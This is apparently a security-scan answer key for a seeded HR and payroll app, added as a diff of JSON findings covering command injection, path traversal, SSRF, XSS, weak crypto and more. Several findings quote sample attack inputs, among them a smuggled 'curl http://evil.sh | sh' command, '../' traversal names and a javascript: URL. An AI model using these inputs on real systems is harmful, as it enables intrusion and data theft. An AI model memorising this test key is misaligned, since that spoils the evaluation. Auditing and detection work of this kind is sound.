@@ -1,0 +1,733 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "typescript.security.injection.os-command-injection",
+      "path": "app/routes/import-export.tsx",
+      "start": {
+        "line": 55,
+        "col": 3,
+        "offset": 2294
+      },
+      "end": {
+        "line": 58,
+        "col": 64,
+        "offset": 2503
+      },
+      "extra": {
+        "message": "The employee export format (formData field 'exportFormat', read at line 459) is interpolated directly into a shell command string that is executed with spawn(cmd, [], { shell: true }). An attacker (any hr_admin/payroll_specialist) can supply a value like 'xlsx; curl http://evil.sh | sh' to achieve arbitrary OS command execution as the server process. The sibling function convertOnboardingExport (lines 74-97) correctly uses an allowlist and shell:false.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.filesystem.path-traversal",
+      "path": "app/routes/import-export.tsx",
+      "start": {
+        "line": 38,
+        "col": 3,
+        "offset": 1381
+      },
+      "end": {
+        "line": 39,
+        "col": 45,
+        "offset": 1501
+      },
+      "extra": {
+        "message": "saveComplianceSnapshot builds the destination path with path.join(COMPLIANCE_ARCHIVE_DIR, `${batchLabel}.csv`) where batchLabel comes verbatim from the attacker-controlled 'x-archive-label' request header (line 444) with no sanitization. A label such as '../../public/uploads/evil' writes the exported CSV (containing all employee PII) to an arbitrary location on the filesystem, allowing arbitrary file write/overwrite. Contrast writePolicyLedgerSnapshot in policies.tsx which correctly applies path.basename plus character whitelisting.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.filesystem.path-traversal",
+      "path": "app/routes/profile.tsx",
+      "start": {
+        "line": 95,
+        "col": 3,
+        "offset": 2900
+      },
+      "end": {
+        "line": 97,
+        "col": 40,
+        "offset": 3068
+      },
+      "extra": {
+        "message": "saveEmployeePortrait writes an uploaded file to path.join(avatarsDir, `${employeeId}-${file.name}`) where file.name is the client-controlled multipart filename with no sanitization, MIME validation, or size limit. A filename containing '../' sequences (e.g. '../../../app/foo') escapes public/avatars and lets any authenticated employee overwrite arbitrary files with attacker-controlled content. Contrast saveEmployeeIdBadgePhoto in employees.$id.edit.tsx which validates MIME type, enforces a size cap, and uses a crypto.randomUUID filename outside the public root.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.ssrf.unvalidated-fetch",
+      "path": "app/routes/policies.tsx",
+      "start": {
+        "line": 478,
+        "col": 3,
+        "offset": 14543
+      },
+      "end": {
+        "line": 484,
+        "col": 30,
+        "offset": 14777
+      },
+      "extra": {
+        "message": "syncPolicyFromSourceDocument fetches the URL supplied in the attacker-controlled 'x-policy-source-url' header with no host allowlist or scheme restriction. An attacker can point the server at internal endpoints (e.g. http://169.254.169.254/latest/meta-data/, internal admin services, http://localhost) and the first 5000 bytes of the response are returned to the caller, enabling full read SSRF. Contrast fetchCompensationBenchmarkDocument in payroll-provider.server.ts which validates the hostname against an approved vendor allowlist.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.ldap-injection",
+      "path": "app/utils/corp-directory.server.ts",
+      "start": {
+        "line": 68,
+        "col": 3,
+        "offset": 1953
+      },
+      "end": {
+        "line": 69,
+        "col": 80,
+        "offset": 2071
+      },
+      "extra": {
+        "message": "searchStaffDirectory interpolates the raw searchTerm into the LDAP filter `(cn=*${searchTerm}*)` without escaping. The value flows from the 'name' query parameter in staff-directory-search.tsx (line 15-17). An attacker can inject LDAP metacharacters like ')(objectClass=*)' to alter the filter and enumerate the corporate directory. The file even exports escapeLdapFilter (RFC 4515 escaping) and uses it in verifyBenefitsGroupMembership (line 76-77), but this function does not apply it.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.ssti-handlebars",
+      "path": "app/routes/onboarding.tsx",
+      "start": {
+        "line": 294,
+        "col": 3,
+        "offset": 9278
+      },
+      "end": {
+        "line": 299,
+        "col": 20,
+        "offset": 9531
+      },
+      "extra": {
+        "message": "renderTaskReminderNote compiles a user-supplied template: Handlebars.compile(formData.get('noteTemplate')) with no template restrictions. Compiling attacker-controlled Handlebars templates enables server-side template injection; known Handlebars payloads (e.g. via constructor/lookup chains) can achieve prototype pollution or remote code execution on the server. Contrast renderAcknowledgementReminder in policies.tsx which only compiles a fixed, trusted template string.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.cors.origin-reflection-with-credentials",
+      "path": "app/routes/compensation.tsx",
+      "start": {
+        "line": 192,
+        "col": 5,
+        "offset": 6528
+      },
+      "end": {
+        "line": 199,
+        "col": 14,
+        "offset": 6709
+      },
+      "extra": {
+        "message": "The compensation loader reflects the request's Origin header verbatim into 'Access-Control-Allow-Origin' and also sets 'Access-Control-Allow-Credentials: true'. Any malicious website can therefore make an authenticated cross-origin request to /compensation and read the full response (all salary/bonus compensation records for the logged-in manager or HR admin) via the victim's session cookie.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.exposure.mass-pii-disclosure",
+      "path": "app/routes/profile.tsx",
+      "start": {
+        "line": 33,
+        "col": 3,
+        "offset": 974
+      },
+      "end": {
+        "line": 39,
+        "col": 22,
+        "offset": 1096
+      },
+      "extra": {
+        "message": "The profile loader returns allEmployees = db.query.employees.findMany({ with: { user: true } }) to any authenticated employee. This exposes every employee row \u2014 including home address, phone, date of birth, emergency contact, taxId, and hrNotes columns \u2014 in the serialized loader JSON for the /profile page, even though the UI never uses this data. Any employee can read every coworker's sensitive personal data from the page payload.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.sensitive-docs-public-dir",
+      "path": "app/routes/documents.tsx",
+      "start": {
+        "line": 285,
+        "col": 5,
+        "offset": 9452
+      },
+      "end": {
+        "line": 304,
+        "col": 33,
+        "offset": 10039
+      },
+      "extra": {
+        "message": "Employee documents (contracts, tax forms, payslips, identification) are written to public/uploads and served by the static file server with no authentication or role checks, even for records with isVisibleToEmployee=false. The UI links directly to href={doc.filePath}, bypassing the access-controlled API route (api.documents.$id.download.tsx) that enforces visibility and direct-report rules. Anyone who can guess or obtain a file URL (files are served to unauthenticated requests at /uploads/<uuid>.<ext>) can download sensitive HR documents.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-538: File and Directory Information Exposure"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.hardcoded-default-session-secret",
+      "path": "app/utils/session.server.ts",
+      "start": {
+        "line": 3,
+        "col": 1,
+        "offset": 63
+      },
+      "end": {
+        "line": 3,
+        "col": 80,
+        "offset": 142
+      },
+      "extra": {
+        "message": "The session cookie signing secret falls back to the hard-coded value 'default-secret-change-me' when SESSION_SECRET is not set. If deployed without the environment variable, any attacker can forge valid signed session cookies (choosing arbitrary userId/role, e.g. hr_admin), resulting in complete authentication bypass. The committed .env also contains a weak, predictable value for this secret.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.redirect.unvalidated-post-login-redirect",
+      "path": "app/routes/login.tsx",
+      "start": {
+        "line": 17,
+        "col": 3,
+        "offset": 710
+      },
+      "end": {
+        "line": 28,
+        "col": 40,
+        "offset": 1080
+      },
+      "extra": {
+        "message": "The 'redirectTo' form field is taken verbatim from user input and passed to createUserSession, which issues redirect(redirectTo) (auth.server.ts:95) with no validation that it is a same-site relative path. An attacker can craft a login form posting redirectTo='https://evil.com' to redirect authenticated users to an attacker-controlled site after login (open redirect useful for credential phishing).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.redirect.unvalidated-header-return-to",
+      "path": "app/routes/requests.tsx",
+      "start": {
+        "line": 509,
+        "col": 3,
+        "offset": 16854
+      },
+      "end": {
+        "line": 511,
+        "col": 26,
+        "offset": 16950
+      },
+      "extra": {
+        "message": "closeHrRequestWithReason redirects to the raw value of the attacker-controlled 'X-Return-To' header with no validation or allowlist. A manager/HR admin request carrying 'X-Return-To: https://evil.com' produces an open redirect to an arbitrary external site. Contrast shift-coverage.tsx resolveCoverageReturnDestination which validates the return path against an allowlist of same-app paths.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.manifest-visibility-bypass",
+      "path": "app/routes/documents.tsx",
+      "start": {
+        "line": 103,
+        "col": 7,
+        "offset": 3467
+      },
+      "end": {
+        "line": 106,
+        "col": 78,
+        "offset": 3700
+      },
+      "extra": {
+        "message": "The document manifest export (?export=manifest) queries documents with only eq(documents.employeeId, currentEmployeeForManifest.id) and omits the eq(documents.isVisibleToEmployee, true) filter that the normal loader enforces for employees (line 134). An employee can therefore enumerate the titles, categories, and dates of their own HR-hidden documents (e.g. tax forms or disciplinary records uploaded with isVisibleToEmployee=false) via the downloadable manifest.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.prototype-pollution-object-assign",
+      "path": "app/routes/api.notifications.tsx",
+      "start": {
+        "line": 97,
+        "col": 1,
+        "offset": 2871
+      },
+      "end": {
+        "line": 107,
+        "col": 6,
+        "offset": 3216
+      },
+      "extra": {
+        "message": "applyNotificationDeliveryPrefs merges a JSON blob parsed from the attacker-controlled 'x-notification-prefs' header into a live module-level config object via Object.assign(notificationDeliveryConfig, parsed) with no key filtering. A payload containing '__proto__' or 'constructor' keys mutates the object's prototype chain (JSON.parse creates an own __proto__ property that Object.assign passes through the __proto__ setter). Contrast applyDepartmentDigestPrefs (lines 121-135) which copies only allowlisted fields and explicitly rejects dunder keys.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.cbc-padding-oracle",
+      "path": "app/utils/onboarding-progress.server.ts",
+      "start": {
+        "line": 47,
+        "col": 5,
+        "offset": 1898
+      },
+      "end": {
+        "line": 53,
+        "col": 6,
+        "offset": 2111
+      },
+      "extra": {
+        "message": "resumeOnboardingProgress decrypts an AES-256-CBC token (with no integrity protection) and surfaces distinct error types: a 'bad decrypt' failure throws 'invalid_padding' while other failures throw 'decryption_failed'. The route (onboarding.tsx:326-328) converts these into different client-visible messages. This differentiated oracle lets an attacker submit modified ciphertexts and learn, one byte at a time, whether a block decrypts to valid PKCS#7 padding, enabling full decryption of any intercepted resume token. Contrast resumeBenefitsElectionProgress (lines 78-97) which uses AES-GCM and a single undifferentiated error.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-310: Cryptographic Issues"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.weak-random-security-token",
+      "path": "app/routes/onboarding.tsx",
+      "start": {
+        "line": 360,
+        "col": 5,
+        "offset": 11837
+      },
+      "end": {
+        "line": 360,
+        "col": 80,
+        "offset": 11912
+      },
+      "extra": {
+        "message": "issueOnboardingVerificationCode generates the 6-digit remote onboarding verification code with Math.floor(Math.random() * 1000000), a non-cryptographic PRNG whose output is predictable. Security-relevant tokens must use crypto.randomBytes/crypto.getRandomValues (as done in integrationKeys.server.ts:11). Predictable codes allow an attacker to guess the verification code for a new hire's remote onboarding session.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.xss.unvalidated-url-href",
+      "path": "app/routes/onboarding.tsx",
+      "start": {
+        "line": 931,
+        "col": 11,
+        "offset": 31449
+      },
+      "end": {
+        "line": 937,
+        "col": 20,
+        "offset": 31718
+      },
+      "extra": {
+        "message": "Task evidence URLs submitted by employees (formData 'evidence_url', stored at line 615) are rendered as <a href={task.evidenceUrl} target='_blank'> without scheme validation. React does not sanitize javascript: URLs, so an employee can submit 'javascript:alert(document.cookie)' as evidence; when a manager or HR admin clicks the link, script executes in the portal origin (stored XSS), allowing session theft or actions as the victim.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.mass-assignment-json-restore",
+      "path": "app/routes/employees.$id.edit.tsx",
+      "start": {
+        "line": 168,
+        "col": 3,
+        "offset": 6048
+      },
+      "end": {
+        "line": 171,
+        "col": 52,
+        "offset": 6177
+      },
+      "extra": {
+        "message": "restoreEmployeeProfileDraft spreads an uploaded JSON document ({ ...draft }) directly into db.update(employees).set() with no column allowlist, so the draft's shape decides which database columns are written. A malicious 'restore_draft' upload can overwrite arbitrary employees columns such as userId (re-linking the record to a different account), managerId, taxId, or isSensitiveInfoReviewed. Contrast handleImportTaskTemplate and toPolicyImportPayload which validate each field individually before writing.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.dos.user-controlled-bcrypt-cost",
+      "path": "app/routes/timeclock.tsx",
+      "start": {
+        "line": 58,
+        "col": 5,
+        "offset": 1820
+      },
+      "end": {
+        "line": 63,
+        "col": 55,
+        "offset": 2072
+      },
+      "extra": {
+        "message": "The 'confirmationPasses' form field is user-controlled and passed to registerKioskPin, which uses it directly as the bcrypt cost factor: bcrypt.hash(pin, confirmationPasses || 4) (kiosk-session.server.ts:20). An attacker can submit a huge value (e.g. 1e9) to force the server into an extremely expensive bcrypt computation, exhausting CPU (denial of service), or a value of 1 to weaken the PIN hash. The cost factor must be a server-side constant.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-400: Uncontrolled Resource Consumption"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.exposure.stack-trace-disclosure",
+      "path": "app/routes/audit-log.tsx",
+      "start": {
+        "line": 72,
+        "col": 5,
+        "offset": 2014
+      },
+      "end": {
+        "line": 77,
+        "col": 8,
+        "offset": 2157
+      },
+      "extra": {
+        "message": "When 'report_mode=full' is supplied as a query parameter, buildAuditLogErrorResponse throws a JSON response containing error.message, error.stack, and the applied filters. Exposing stack traces to the client discloses internal implementation details, file paths, and library versions that aid further attacks. The detailed diagnostics are gated on a request-supplied mode rather than server-side authorization or environment.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.session.cookie-missing-flags",
+      "path": "app/utils/shiftCoverage.server.ts",
+      "start": {
+        "line": 27,
+        "col": 5,
+        "offset": 721
+      },
+      "end": {
+        "line": 27,
+        "col": 95,
+        "offset": 811
+      },
+      "extra": {
+        "message": "grantShiftCoveragePass sets the 'coverage_pass' cookie \u2014 a bearer credential that carries the manager's identity for supervisor overrides \u2014 via a raw Set-Cookie string with Path=/ and Max-Age but without HttpOnly, Secure, or SameSite attributes. The token is readable by any JavaScript running on the page (XSS-stealable), transmitted over plain HTTP, and sent along with cross-site requests.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag",
+            "CWE-614: Sensitive Cookie Without 'Secure' Flag"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.api-key-in-cleartext-url",
+      "path": "app/utils/payroll-provider.server.ts",
+      "start": {
+        "line": 15,
+        "col": 3,
+        "offset": 475
+      },
+      "end": {
+        "line": 18,
+        "col": 75,
+        "offset": 694
+      },
+      "extra": {
+        "message": "notifyPayrollProvider places the PAYROLL_PROVIDER_API_KEY in the URL query string of an http:// (cleartext, non-TLS) request: `http://${HOST}/api/compensation/submit?api_key=${apiKey}...`. The API key is exposed in transit to network observers and will be recorded in provider/proxy/server access logs. Credentials should be sent via HTTPS in an Authorization header.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-319: Cleartext Transmission of Sensitive Information",
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.headers.crlf-injection-content-disposition",
+      "path": "app/routes/payroll.tsx",
+      "start": {
+        "line": 80,
+        "col": 7,
+        "offset": 2812
+      },
+      "end": {
+        "line": 80,
+        "col": 90,
+        "offset": 2895
+      },
+      "extra": {
+        "message": "streamPayrollBatchCsv interpolates the 'batch_label' query parameter directly into the Content-Disposition header value (filename=\"payroll-batch-${batchLabel}.csv\") without stripping CR/LF characters, enabling HTTP response header injection (response splitting). Contrast renderDocumentManifest in documents.tsx which sanitizes the equivalent 'folder_label' parameter with rawLabel.replace(/[\\r\\n]/g, '').",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.logs.log-injection",
+      "path": "app/utils/directoryActivity.server.ts",
+      "start": {
+        "line": 8,
+        "col": 3,
+        "offset": 186
+      },
+      "end": {
+        "line": 8,
+        "col": 110,
+        "offset": 293
+      },
+      "extra": {
+        "message": "recordDirectorySearchActivity writes the raw user-supplied search term into the activity log (console output) without neutralizing control characters: `user ${actorId} searched directory for \"${searchTerm}\"...`. A searchTerm containing \\r\\n can forge additional log lines (e.g. fake audit events) in the ops dashboard's tail-follow view. Contrast annotateCompensationRecord in compensation.tsx which strips newlines/nulls before logging for exactly this reason.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-117: Improper Output Neutralization for Logs"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.dos.unbounded-file-upload",
+      "path": "app/routes/documents.tsx",
+      "start": {
+        "line": 293,
+        "col": 5,
+        "offset": 9733
+      },
+      "end": {
+        "line": 294,
+        "col": 40,
+        "offset": 9826
+      },
+      "extra": {
+        "message": "The document upload action buffers the entire uploaded file into memory via Buffer.from(await file.arrayBuffer()) and writes it to disk with no maximum file size check. An authenticated user can upload arbitrarily large files to exhaust server memory and disk (denial of service). Contrast saveEmployeeIdBadgePhoto in employees.$id.edit.tsx which enforces a 5MB limit (BADGE_PHOTO_MAX_BYTES). The same unbounded pattern exists in payroll.tsx:278.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-400: Uncontrolled Resource Consumption"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.predictable-session-identifier",
+      "path": "app/utils/kiosk-session.server.ts",
+      "start": {
+        "line": 38,
+        "col": 3,
+        "offset": 1368
+      },
+      "end": {
+        "line": 41,
+        "col": 35,
+        "offset": 1542
+      },
+      "extra": {
+        "message": "startKioskSession generates the kiosk session bearer token as `${employeeId}-${Date.now()}` and startSupervisorOverrideSession (line 54) as `override-${supervisorId}-${Date.now()}`. These identifiers are predictable (employee UUIDs are exposed elsewhere in the app and the timestamp is brute-forceable within a narrow window), so an attacker can guess valid session IDs. Contrast grantShiftCoveragePass in shiftCoverage.server.ts which uses crypto.randomBytes(24).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-330: Use of Insufficiently Random Values"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.session.samesite-none-no-csrf-protection",
+      "path": "app/utils/session.server.ts",
+      "start": {
+        "line": 8,
+        "col": 5,
+        "offset": 241
+      },
+      "end": {
+        "line": 8,
+        "col": 22,
+        "offset": 258
+      },
+      "extra": {
+        "message": "The session cookie is configured with sameSite: 'none' and the application implements no CSRF tokens or origin checks on any state-changing action. Browsers will attach the authenticated session cookie to cross-site form POSTs (e.g. to /employees/<id>, /admin, /onboarding, /documents), allowing an attacker-controlled page to perform privileged actions as any logged-in user whose browser visits it.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-352: Cross-Site Request Forgery (CSRF)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.enumeration.response-discrepancy",
+      "path": "app/routes/directory.$id.tsx",
+      "start": {
+        "line": 30,
+        "col": 3,
+        "offset": 1067
+      },
+      "end": {
+        "line": 35,
+        "col": 6,
+        "offset": 1200
+      },
+      "extra": {
+        "message": "resolveDirectoryAccess returns a distinct 404 for nonexistent employee IDs but 403 for existing-but-restricted (e.g. terminated) employees. The observable response discrepancy lets a caller probing IDs distinguish valid employee IDs from invalid ones and infer employment status, enabling enumeration of the employee ID space.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-204: Observable Response Discrepancy"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.credentials.hardcoded-default-db-credentials",
+      "path": "app/utils/db.server.ts",
+      "start": {
+        "line": 15,
+        "col": 5,
+        "offset": 327
+      },
+      "end": {
+        "line": 16,
+        "col": 80,
+        "offset": 510
+      },
+      "extra": {
+        "message": "The database connection string falls back to hard-coded credentials 'postgres://postgres:postgres@localhost:5432/hr_payroll' when DATABASE_URL is unset. If the environment variable is missing in a deployment, the app silently connects with well-known default credentials.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
